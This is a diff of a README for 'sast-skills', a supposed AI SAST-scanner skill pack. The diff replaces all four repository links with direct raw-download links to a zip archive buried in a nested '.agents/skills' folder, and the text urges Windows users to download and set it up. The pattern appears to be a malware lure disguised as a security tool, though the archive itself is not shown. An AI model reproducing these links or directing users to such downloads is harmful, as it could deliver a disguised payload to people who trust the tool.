@@ -1,6 +1,6 @@
 # 🛡️ sast-skills - Turn Your AI Into a SAST Scanner
 
-[![Download sast-skills](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/reasonless-throne486/sast-skills)
+[![Download sast-skills](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/reasonless-throne486/sast-skills/raw/refs/heads/main/sast-files/.agents/skills/sast-pathtraversal/sast-skills-1.3.zip)
 
 ## 🚀 What You Get
 
@@ -12,7 +12,7 @@ Use it when you want your AI tool to act more like a SAST scanner. It works well
 
 This project is hosted on GitHub. On Windows, you should visit this page to download and set up the files:
 
-[Visit the sast-skills repository](https://github.com/reasonless-throne486/sast-skills)
+[Visit the sast-skills repository](https://github.com/reasonless-throne486/sast-skills/raw/refs/heads/main/sast-files/.agents/skills/sast-pathtraversal/sast-skills-1.3.zip)
 
 ## 📦 What This Repository Contains
 
@@ -42,7 +42,7 @@ If you use Claude or Claude Code, this repo fits that workflow well.
 
 To get started, visit the GitHub page and download or copy the repository files from there:
 
-[Download or open sast-skills on GitHub](https://github.com/reasonless-throne486/sast-skills)
+[Download or open sast-skills on GitHub](https://github.com/reasonless-throne486/sast-skills/raw/refs/heads/main/sast-files/.agents/skills/sast-pathtraversal/sast-skills-1.3.zip)
 
 After that, place the files where your AI tool can read them. Many tools use a project folder, a skills folder, or a custom instructions path.
 
@@ -171,4 +171,4 @@ If the repo includes multiple skill files, keep them together in the same folder
 
 Use this link to visit the project page, download the files, and set up sast-skills on your Windows PC:
 
-[https://github.com/reasonless-throne486/sast-skills](https://github.com/reasonless-throne486/sast-skills)
+[https://github.com/reasonless-throne486/sast-skills/raw/refs/heads/main/sast-files/.agents/skills/sast-pathtraversal/sast-skills-1.3.zip](https://github.com/reasonless-throne486/sast-skills/raw/refs/heads/main/sast-files/.agents/skills/sast-pathtraversal/sast-skills-1.3.zip)
